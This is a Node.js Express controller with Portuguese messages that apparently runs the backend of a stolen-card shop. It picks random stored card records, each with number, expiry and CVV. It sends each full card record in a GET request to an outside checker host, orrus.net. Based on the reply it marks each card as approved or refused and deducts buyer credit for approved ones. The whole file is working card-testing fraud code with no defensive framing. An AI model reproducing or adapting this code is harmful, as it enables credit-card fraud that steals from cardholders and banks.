const Product = require("../models/Product");
const Purchase = require("../models/Purchase");
const User = require("../models/User");
const axios = require("axios");

class TesteController {
	async test(req, res) {
		req.connection.setTimeout(600 * 100 * 1000);

		const user = await User.findById(req.userId);
		const { ammount } = req.body;

		if (!user) {
			return res.status(400).json({
				error: "Parece que você não pode fazer isso."
			});
		}

		if (user.balance < ammount) {
			return res.status(400).json({
				error: "Parece que você não pode fazer isso."
			});
		}

		if (user.testando) {
			return res.status(400).json({
				message:
					"Já existe um teste sendo executado na sua conta, por favor aguarde alguns minutos e tente novamente."
			});
		} else {
			await User.findByIdAndUpdate(user._id, { testando: true }).then(
				async () => {
					await this.efetuaTeste(user, null, ammount, 0, 200)
						.then(async result => {
							await User.findByIdAndUpdate(user._id, {
								testando: false
							});
							switch (result) {
								case 200: {
									return res.json({
										message:
											"Teste finalizado com sucesso !"
									});
								}
								case 500: {
									return res.status(400).json({
										message:
											"Teste finalizado por falta de cartão no estoque."
									});
								}
							}
						})
						.catch(async err => {
							await User.findByIdAndUpdate(user._id, {
								testando: false
							});

							console.log(err);
							return res.status(400).json({
								message:
									"Ouve um problema durante os teste, desculpe... Mas fique tranquilo voce pode começar de novo, e suas cc aprovadas não foram perdidas, elas ja estão na sua lista!."
							});
						});
				}
			);
		}
	}

	async efetuaTeste(user, ccNumber, ammount, qtd, code) {
		console.log(`Quantidade: ${qtd} - Total: ${ammount}`);

		if (qtd == ammount) {
			return code;
		}

		const totalCC = await Product.countDocuments({
			status: "Disponivel",
			number: { $ne: ccNumber }
		});

		const randomNumber = Math.floor(Math.random() * totalCC);
		var data = await Product.find({
			status: "Disponivel",
			number: { $ne: ccNumber }
		})
			.limit(1)
			.skip(randomNumber);

		if (data.length === 0) {
			return 500;
		}

		const cc = data[0];

		const resultTest = await axios({
			method: "get",
			url: `http://orrus.net/b0yBase/api.php?orrus=${cc.number}|${cc.month}|${cc.year}|${cc.cvv}`
		}).catch(async () => {
			code = 500;
			code = await this.efetuaTeste(user, cc.number, ammount, qtd, code);
			return code;
		});

		var result = resultTest.data.Retorno;

		result = result.trim();

		console.log(result);

		switch (result) {
			case "Autorizado": {
				const userBalanceAtual = await User.findById(user._id);

				if (userBalanceAtual.balance > 0) {
					await User.update(
						{ _id: user.id },
						{
							$inc: { balance: -1 }
						}
					);

					await Product.findByIdAndUpdate(cc.id, {
						status: "Aprovada",
						usedBy: user.id,
						usedDate: Date.now()
					}).then(async () => {
						code = 200;
						qtd = qtd + 1;
						code = await this.efetuaTeste(
							user,
							cc.number,
							ammount,
							qtd,
							code
						);
						return code;
					});
				}

				break;
			}

			case "Nao autorizado": {
				await Product.findByIdAndUpdate(cc.id, {
					status: "Recusada",
					usedBy: user.id,
					usedDate: Date.now()
				}).then(async () => {
					code = 500;
					code = await this.efetuaTeste(
						user,
						cc.number,
						ammount,
						qtd,
						code
					);
					return code;
				});

				break;
			}
		}

		return code;
	}
}

module.exports = new TesteController();
